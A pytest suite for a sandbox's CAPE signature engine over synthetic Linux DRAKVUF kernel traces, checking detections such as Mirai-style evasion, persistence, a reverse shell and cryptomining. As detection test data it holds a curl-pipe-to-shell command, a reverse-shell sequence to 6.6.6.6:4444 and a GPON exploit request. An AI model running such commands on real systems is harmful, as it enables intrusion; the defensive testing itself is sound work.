"""CAPE signatures over the kernel's side of a Linux DRAKVUF trace.

The engine (cape_plugin/plugins.py, abstracts.py): an evented signature with
`kernel_calls` gets the syscall/procmon/filetracer/unixsocketmon calls, by
syscall name, and only those; the others keep the apimon/libmon ones. And
the Linux signatures of the community checkout (modules/signatures/linux,
helper modules/signatures/drakvuf_utils.py) over synthetic traces shaped
like the Ubuntu job of 2026-11-11: syscall + sysret paired by number,
filetracer sharing the syscall's EventUID, unixsocketmon's endpoint record
written before the syscall it belongs to (the syscall goes out at its
return).
"""
from __future__ import annotations

import importlib
import json
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(ROOT))

from sandboxd.guests import TargetOs  # noqa: E402
from sandboxd.postprocessing.plugins.plugin_base import (  # noqa: E402
    CapeConfigSection, PostprocessContext, PostprocessingConfig,
)

cape_analysis = importlib.import_module("sandboxd.postprocessing.plugins.cape_analysis")
COMMUNITY = ROOT / "sandboxd" / "data" / "cape-community"
HAVE_LINUX_SIGNATURES = (COMMUNITY / "modules" / "signatures" / "drakvuf_utils.py").is_file()

NR = {"open": 2, "close": 3, "write": 1, "read": 0, "unlink": 87, "chmod": 90, "ioctl": 16, "prctl": 157,
      "reboot": 169, "setpriority": 141, "socket": 41, "connect": 42, "dup2": 33, "ptrace": 101,
      "memfd_create": 319, "execveat": 322, "mmap": 9, "mount": 165, "setsockopt": 54, "getsockname": 51,
      "setsid": 112, "chdir": 80, "access": 21}


class Trace:
    """A Linux trace.log of one sample process (PID 100) and its children."""

    def __init__(self, image="/home/u/s.elf", pid=100):
        self.uid = 0x10
        self.pid = pid
        self.names = {pid: image}
        self.records = [
            {"Plugin": "inject", "TimeStamp": "1000.0", "Method": "ExecProc", "Status": "Success",
             "ProcessName": "/usr/bin/sh", "InjectedPid": pid, "InjectedTid": pid},
            {"Plugin": "procmon", "PID": 1, "PPID": 0, "RunningProcess": "systemd"},
            {"Plugin": "procmon", "PID": pid, "PPID": 1, "RunningProcess": "sh"},
        ]
        self.exec(pid, image, image)

    def _record(self, plugin, on, method, **extra):
        self.uid += 1
        rec = {"Plugin": plugin, "TimeStamp": f"{1000 + self.uid / 1000:.6f}", "PID": on, "PPID": 1, "TID": on,
               "UserId": 0, "ProcessName": self.names.get(on), "Method": method, "EventUID": hex(self.uid)}
        rec.update(extra)
        self.records.append(rec)

    def syscall(self, method, ret="0x0", on=None, filetracer=None, **arguments):
        on = on or self.pid
        if filetracer is not None:
            self._record("filetracer", on, "do_syscall_64", Syscall=method, **filetracer)
            self.uid -= 1       # the syscall's own EventUID
        self._record("syscall", on, method, Module="linux", Syscall=NR[method], Type="x64", **arguments)
        self._record("sysret", on, method, Module="linux", Syscall=NR[method], Ret=ret, Info="")

    def open(self, path, flags="0x0", ret="0x3", on=None):
        self.syscall("open", ret=ret, on=on, filetracer={"FileName": path, "flags": str(int(flags, 16))},
                     pathname=path, flags=flags, mode="0x0")

    def exec(self, on, cmdline, image, env=None, oeuid=0, euid=0):
        self.names[on] = image
        extra = {"Environment": env} if env else {}
        self._record("procmon", on, "do_execveat_common", CommandLine=cmdline, ImagePathName=image, FileName=image,
                     ouid=oeuid, osuid=0, oeuid=oeuid, suid=0, euid=euid, interp=image, **extra)

    def clone(self, on, child):
        self.names[child] = self.names[on]
        self._record("procmon", on, "kernel_clone", Flags="(null)", Signal=17, SignalStr="SIGCHLD", NewPid=child)

    def socketmon(self, method, on=None, **fields):
        self._record("unixsocketmon", on or self.pid, method, **fields)

    def run(self, tmp_path, community=COMMUNITY):
        (tmp_path / "trace.log").write_text("".join(json.dumps(r) + "\n" for r in self.records))
        context = PostprocessContext(tmp_path, PostprocessingConfig(), TargetOs.UBUNTU)
        return cape_analysis.run_cape(context, CapeConfigSection(capa=False, community=community, compress_trace=False))


@pytest.fixture
def fresh_loader():
    """The loader's registry and import shims are process-wide: reset them
    after a test, as test_cape_split does."""
    from sandboxd.postprocessing.plugins.cape_plugin import signatures as loader
    yield
    loader._loaded_from = None
    loader.list_plugins("signatures").clear()
    for name in [n for n in sys.modules if n.startswith("modules.signatures")]:
        del sys.modules[name]


def matched(results):
    return {s["name"]: s for s in results.get("signatures", [])}


# --- engine ----------------------------------------------------------------------------

def test_kernel_calls_signatures_get_the_kernel_side_only(tmp_path, fresh_loader):
    """Same filter, two signatures: the kernel_calls one sees the prctl
    syscall and not libmon's prctl; the default one the other way round."""
    sigs = tmp_path / "community" / "modules" / "signatures" / "linux"
    sigs.mkdir(parents=True)
    body = ("class {cls}(Signature):\n    name = '{name}'\n    evented = True\n    kernel_calls = {kernel}\n"
            "    filter_apinames = {{'prctl'}}\n"
            "    def on_call(self, call, process):\n"
            "        self.data.append({{'side': 'kernel' if 'syscall' in call else 'api'}})\n"
            "    def on_complete(self):\n        return bool(self.data)\n")
    (sigs / "sides.py").write_text("from lib.cuckoo.common.abstracts import Signature\n"
                                   + body.format(cls="Kernel", name="kernel_side", kernel=True)
                                   + body.format(cls="Api", name="api_side", kernel=False))
    trace = Trace()
    trace.syscall("prctl", option="PR_SET_NAME", arg2="0x1", arg3="0x0", arg4="0x0", arg5="0x0")
    trace._record("libmon", trace.pid, "prctl", Event="api_called", Library="/usr/lib/x86_64-linux-gnu/libc.so.6",
                  ReturnValue="0x0", Arguments=["Option=0xf", "Arg2=0x1"])
    (tmp_path / "job").mkdir()
    results = matched(trace.run(tmp_path / "job", community=tmp_path / "community"))
    assert results["kernel_side"]["data"] == [{"side": "kernel"}]
    assert results["api_side"]["data"] == [{"side": "api"}]


def test_check_api_skips_kernel_calls(tmp_path, fresh_loader):
    """check_api indexed call["api"] and raised on the first syscall."""
    sigs = tmp_path / "community" / "modules" / "signatures" / "linux"
    sigs.mkdir(parents=True)
    (sigs / "api.py").write_text(
        "from lib.cuckoo.common.abstracts import Signature\n"
        "class Api(Signature):\n    name = 'calls_prctl'\n"
        "    def run(self):\n        return self.check_api('prctl') is not None\n")
    trace = Trace()
    trace.syscall("prctl", option="PR_SET_NAME", arg2="0x1", arg3="0x0", arg4="0x0", arg5="0x0")
    (tmp_path / "job").mkdir()
    assert "calls_prctl" not in matched(trace.run(tmp_path / "job", community=tmp_path / "community"))


def test_linux_syscall_status_is_the_errno(tmp_path):
    from sandboxd.postprocessing.plugins.cape_plugin.behaviour import _syscall_ok
    assert _syscall_ok("0xfffffffffffffffe", True) is False
    assert _syscall_ok("0x5", True) is True
    assert _syscall_ok(None, True) is None


# --- signatures ------------------------------------------------------------------------

needs_tree = pytest.mark.skipif(not HAVE_LINUX_SIGNATURES, reason="cape-community checkout without the Linux signatures")


@needs_tree
def test_iot_bot_start_up(tmp_path, fresh_loader):
    """What the Mirai-family sample of 2026-11-11 does after its fork."""
    t = Trace()
    t.syscall("setsid", ret="0x64")
    t.syscall("chdir", filetracer={"FileName": "/"}, path="/")
    t.syscall("prctl", option="PR_SET_DUMPABLE", arg2="0x0", arg3="0x0", arg4="0x0", arg5="0x0")
    t.open("/proc/self/oom_score_adj", flags="0x1", ret="0x5")
    t.syscall("write", fd="0x5", buf="0x1", count="0x5", ret="0x5",
              filetracer={"FileName": "/100/oom_score_adj", "FileHandle": 5})
    t.syscall("setpriority", which="0x0", who="0x0", prio="0xffffffec")
    t.open("/proc/self/exe", ret="0x6")
    t.syscall("ioctl", fd="0x6", request="0x40086602")
    t.syscall("reboot", magic="0xfee1dead", magic2="0x28121969", cmd="0x0", arg="0x0")
    t.open("/dev/null", flags="0x2", ret="0x7")
    t.syscall("dup2", oldfd="0x7", newfd="0x0", ret="0x0")
    t.socketmon("connect", Type="AF_INET", Protocol="UDP", RemoteIp="8.8.8.8", RemotePort=53)
    t.syscall("socket", domain="0x2", type="0x2", protocol="0x0", ret="0x8")
    t.syscall("connect", sockfd="0x8", addr="0x1", addrlen="0x10")
    t.syscall("getsockname", sockfd="0x8", addr="0x1", addrlen="0x1")
    for i in range(6):
        t.socketmon("connect", Type="AF_INET", Protocol="TCP", RemoteIp=f"45.1.2.{i + 1}", RemotePort=(23, 2222, 2323)[i % 3])
    results = t.run(tmp_path)
    names = matched(results)
    for expected in ("linux_antidump", "linux_oom_killer_evasion", "linux_immutable_attribute", "linux_ctrl_alt_del_disabled",
                     "linux_daemonize", "linux_hardcoded_dns_resolver", "linux_local_address_discovery",
                     "linux_remote_login_bruteforce"):
        assert expected in names, expected
    assert names["linux_immutable_attribute"]["data"][0]["file"] == "/proc/self/exe"
    assert names["linux_remote_login_bruteforce"]["data"][0]["by_port"] == {23: 2, 2222: 2, 2323: 2}
    assert results["statistics"]["signature_failures"] == []


@needs_tree
def test_persistence_and_trojanized_binaries(tmp_path, fresh_loader):
    t = Trace()
    t.open("/etc/ssh/sshd_config", flags="0x401", ret="0x3")
    t.open("/usr/sbin/sshd", flags="0x241", ret="0x3")
    t.open("/etc/pam.d/common-auth", flags="0x1", ret="0x3")
    t.open("/lib/x86_64-linux-gnu/libkeyutils.so.1", flags="0x241", ret="0x3")
    t.open("/etc/cron.d/x", flags="0x41", ret="0x3")
    t.open("/etc/passwd", flags="0x0", ret="0x3")
    names = matched(t.run(tmp_path))
    assert {"linux_sshd_config_modification", "linux_system_binary_modification", "linux_persistence_pam",
            "linux_system_library_modification", "linux_persistence_cron"} <= set(names)
    assert {"sensitive_binaries": "sshd"} in names["linux_system_binary_modification"]["data"]
    # /etc/passwd only read
    assert "linux_account_manipulation" not in names


@needs_tree
def test_reverse_shell_through_an_inherited_socket(tmp_path, fresh_loader):
    """The socket made in the parent, dup2'd and the shell run in the child:
    the child's fds come from kernel_clone."""
    t = Trace()
    t.socketmon("connect", Type="AF_INET", Protocol="TCP", RemoteIp="6.6.6.6", RemotePort=4444)
    t.syscall("socket", domain="0x2", type="0x1", protocol="0x0", ret="0x3")
    t.syscall("connect", sockfd="0x3", addr="0x1", addrlen="0x10")
    t.clone(t.pid, 101)
    for fd in (0, 1, 2):
        t.syscall("dup2", on=101, oldfd="0x3", newfd=hex(fd), ret=hex(fd))
    t.exec(101, "/bin/sh -i", "/bin/sh")
    names = matched(t.run(tmp_path))
    assert names["linux_reverse_shell"]["data"][0]["peer"] == "6.6.6.6:4444"
    assert "linux_bind_shell" not in names


@needs_tree
def test_payloads_read_from_what_was_sent(tmp_path, fresh_loader):
    """IRC, an exploit and the stratum protocol, from unixsocketmon's bytes:
    no pcap needed."""
    t = Trace()
    for port, data in ((6667, b"NICK bot\r\nUSER a b c :d\r\nJOIN #x\r\n"),
                       (80, b"POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: 9.9.9.1\r\n\r\n"),
                       (3333, b'{"id":1,"method":"login","params":{"agent":"XMRig/6.21"}}')):
        t.socketmon("sock_sendmsg", Type="AF_INET", Protocol="TCP", LocalIp="172.16.1.2", LocalPort=40000,
                    RemoteIp="9.9.9.1", RemotePort=port, Connected=1, Size=len(data), Value=data.hex())
    names = matched(t.run(tmp_path))
    assert {"linux_irc_command_and_control", "linux_exploit_propagation", "linux_cryptominer"} <= set(names)
    assert names["linux_exploit_propagation"]["data"][0]["exploit"].startswith("GPON")


@needs_tree
def test_command_lines(tmp_path, fresh_loader):
    t = Trace()
    t.clone(t.pid, 102)
    for cmdline, image in (("sh -c curl http://x/a.sh | sh", "/bin/sh"), ("/bin/busybox ECCHI", "/bin/busybox"),
                           ("[kworker/0:1]", "/tmp/.x/k"), ("iptables -F", "/usr/sbin/iptables")):
        t.exec(102, cmdline, image)
    t.exec(102, "/tmp/rootsh -p", "/tmp/rootsh", oeuid=1000, euid=0)
    names = matched(t.run(tmp_path))
    assert {"linux_suspicious_shell_command", "linux_busybox_probe", "linux_argv0_spoofing", "linux_firewall_tampering",
            "linux_execution_from_unusual_path", "linux_privilege_escalation_exec"} <= set(names)
    assert names["linux_argv0_spoofing"]["severity"] == 3
    # `iptables` holds "les", which matched the exploit suggester's name once
    assert "linux_kernel_exploit_recon" not in names


@needs_tree
def test_an_ordinary_program_is_clean(tmp_path, fresh_loader):
    t = Trace(image="/usr/bin/curl")
    t.open("/etc/ld.so.cache", flags="0x80000")
    t.open("/lib/x86_64-linux-gnu/libc.so.6", flags="0x80000")
    t.syscall("mmap", addr="0x0", length="0x1000", prot="PROT_READ | PROT_EXEC", flags="MAP_PRIVATE | MAP_DENYWRITE",
              fd="0x3", offset="0x0", ret="0x7f00")
    for path in ("/etc/passwd", "/proc/self/status", "/proc/cpuinfo", "/etc/resolv.conf", "/etc/nsswitch.conf",
                 "/home/u/.bashrc"):
        t.open(path, flags="0x80000")
    t.socketmon("connect", Type="AF_INET", Protocol="UDP", RemoteIp="127.0.0.53", RemotePort=53)
    t.socketmon("connect", Type="AF_INET", Protocol="TCP", RemoteIp="93.184.216.34", RemotePort=443)
    t.open("/home/u/.cache/curl/x", flags="0x241", ret="0x4")
    results = t.run(tmp_path)
    loud = [s["name"] for s in results["signatures"] if s["name"].startswith("linux_") and s["severity"] >= 2]
    assert loud == []
    # "Clean" was stealth_network (0.5) taking unixsocketmon's connects for traffic no API call made
    assert results["malstatus"] == "Undetected"
    assert "deletes_files" not in matched(results)     # O_CREAT|O_TRUNC is a new file, not a deletion


def test_a_signature_adding_ttps_keeps_them_its_own(tmp_path, fresh_loader):
    """family_proxyback does `self.ttps += [...]` as it runs; on a class
    declaring none that extended Signature's own list, and every later
    signature declaring none reported its TTPs."""
    sigs = tmp_path / "community" / "modules" / "signatures" / "linux"
    sigs.mkdir(parents=True)
    (sigs / "adds.py").write_text(
        "from lib.cuckoo.common.abstracts import Signature\n"
        "class Adds(Signature):\n    name = 'adds'\n    order = 1\n"
        "    def run(self):\n        self.ttps += ['T1071']\n        self.mbcs += ['OC0006']\n        return True\n"
        "class Plain(Signature):\n    name = 'plain'\n    order = 2\n"
        "    def run(self):\n        return True\n")
    (tmp_path / "job").mkdir()
    results = Trace().run(tmp_path / "job", community=tmp_path / "community")
    assert {t["signature"]: t["ttps"] for t in results["ttps"]} == {"adds": ["T1071"]}


@needs_tree
def test_a_daemonized_child_stays_in_the_sample(tmp_path, fresh_loader):
    """The sample forks and exits; its child goes on with PPID 1 on every
    later line. The child is still the sample's (process_tree.REBIND_ON_PPID_CHANGE),
    and what it does reaches the signatures."""
    t = Trace()
    t.clone(t.pid, 101)
    t._record("procmon", t.pid, "do_exit", ExitStatus=0, ExitStatusStr="EXIT_SUCCESS")
    t._record("procmon", 101, "send_signal", TargetPID=555, TargetTID=555, TargetPPID=1,
              TargetProcessName="/usr/bin/x", Signal=14, SignalStr="SIGALRM")
    t.syscall("reboot", on=101, magic="0xfee1dead", magic2="0x28121969", cmd="0x0", arg="0x0")
    results = t.run(tmp_path)
    assert sorted(p["process_id"] for p in results["behavior"]["processes"]) == [100, 101]
    assert matched(results)["linux_ctrl_alt_del_disabled"]["data"][0]["process"].endswith("(101)")
